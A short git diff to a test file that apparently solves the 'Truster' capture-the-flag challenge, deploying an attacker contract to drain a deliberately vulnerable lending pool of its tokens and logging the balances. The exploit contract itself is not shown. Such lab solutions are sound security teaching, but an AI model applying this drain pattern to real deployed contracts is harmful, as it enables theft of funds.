@@ -23,6 +23,15 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Deploy the attacker smart contract
+        const Attacker = await ethers.getContractFactory('Attacker_Truster', player);
+        attacker = await Attacker.deploy();
+        // Call the attack function
+        await attacker.attack(pool.address,token.address,TOKENS_IN_POOL);
+        // balance: 1 M DVT
+        console.log(await token.balanceOf(player.address))
+        // balance: 0 DVT
+        console.log(await token.balanceOf(pool.address))
     });
 
     after(async function () {
